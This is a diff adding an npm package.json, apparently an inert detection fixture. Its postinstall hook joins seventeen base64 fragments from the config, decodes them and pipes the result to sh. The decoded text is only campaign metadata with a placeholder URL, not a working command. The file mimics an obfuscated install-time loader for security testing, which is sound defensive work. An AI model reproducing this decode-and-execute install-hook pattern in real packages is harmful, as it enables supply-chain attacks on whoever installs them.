@@ -1,0 +1,26 @@
+{
+  "name": "inert-fixture",
+  "version": "1.0.0",
+  "config": {
+    "d0": "dj0zfGxhbmd1YWdlPW5vZGV8",
+    "d1": "cm9sZT1sYXVuY2hlcnx2ZXJk",
+    "d2": "aWN0PXN1c3BpY2lvdXN8YXR0",
+    "d3": "YWNrPVQxMDU5fGFkYXB0ZXI9",
+    "d4": "cHJvY2Vzc19zcGF3bnxob3N0",
+    "d5": "X3Byb2ZpbGU9bnBtX2xpZmVj",
+    "d6": "eWNsZXxvYmZ1c2NhdGlvbl9w",
+    "d7": "cm9maWxlPWJhc2U2NHxzdGFn",
+    "d8": "ZV9wcm9maWxlPXNpbmdsZV9z",
+    "d9": "dGFnZXxuZXh0X2xhbmd1YWdl",
+    "d10": "PXNofGNhbXBhaWduX2lkPU5Q",
+    "d11": "LTRlNmQyYjE4fHVybD1odHRw",
+    "d12": "czovL25wLTRlNmQyYjE4LmV4",
+    "d13": "YW1wbGUuaW52YWxpZC9zdGFn",
+    "d14": "ZXxmaWxlX3BhdGg9L3RtcC9o",
+    "d15": "dW50cmVzcy1ucC00ZTZkMmIx",
+    "d16": "OC8uc3RhZ2U="
+  },
+  "scripts": {
+    "postinstall": "echo $npm_package_config_d0$npm_package_config_d1$npm_package_config_d2$npm_package_config_d3$npm_package_config_d4$npm_package_config_d5$npm_package_config_d6$npm_package_config_d7$npm_package_config_d8$npm_package_config_d9$npm_package_config_d10$npm_package_config_d11$npm_package_config_d12$npm_package_config_d13$npm_package_config_d14$npm_package_config_d15$npm_package_config_d16 | base64 -d | sh"
+  }
+}
